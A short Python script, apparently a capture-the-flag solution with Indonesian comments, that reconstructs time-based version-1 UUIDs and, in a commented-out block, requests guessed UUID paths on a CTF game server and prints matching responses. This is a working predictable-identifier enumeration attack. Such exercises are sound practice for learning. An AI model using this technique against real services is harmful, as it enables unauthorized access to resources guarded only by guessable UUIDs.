from uuid import UUID
from random import randint


def gen(timestamp):
	clock_seq = 0
	timestamp = timestamp  # waktu dalam 100-nanosecond sejak 15 Oktober 1582

	time_low = timestamp & 0xFFFFFFFF  # 32 bit terakhir
	time_mid = (timestamp >> 32) & 0xFFFF  # 16 bit berikutnya
	time_hi_version = ((timestamp >> 48) & 0x0FFF) | (1 << 12)  # 16 bit berikutnya dengan versi

	clock_seq_low = clock_seq & 0xFF
	clock_seq_hi_variant = (clock_seq >> 8) & 0x3F | 0x80  # Tambahkan bit varian

	node = 0x000000000000

	uuid_reconstructed = UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node))
	print(uuid_reconstructed)
# for i in range(9):
a = 139500170021133437
gen(a)
# e20a44dc-9aa9-11ef-80da-0242ac120003
# 60375c7d-9aaa-11ef-80e1-0242ac120003

# import requests
# from uuid import UUID

# url = 'http://mctf-game.ru:5003'

# def gen_uuid(i):
# 	clock_seq = i
# 	timestamp = 139498448451962005  # waktu dalam 100-nanosecond sejak 15 Oktober 1582

# 	time_low = timestamp & 0xFFFFFFFF  # 32 bit terakhir
# 	time_mid = (timestamp >> 32) & 0xFFFF  # 16 bit berikutnya
# 	time_hi_version = ((timestamp >> 48) & 0x0FFF) | (1 << 12)  # 16 bit berikutnya dengan versi

# 	clock_seq_low = clock_seq & 0xFF
# 	clock_seq_hi_variant = (clock_seq >> 8) & 0x3F | 0x80  # Tambahkan bit varian

# 	node = 0x02420a000911

# 	uuid_reconstructed = UUID(fields=(time_low, time_mid, time_hi_version, clock_seq_hi_variant, clock_seq_low, node))
# 	return uuid_reconstructed

# # for i in range(256):
# path = gen_uuid(2)
# print(url+f'/{path}')
# respose = requests.get(url+f'/{path}')
# if 'FAKE' in respose.text:
# 	print(respose.text)
# elif '500' not in respose.text:
# 	print(respose.text)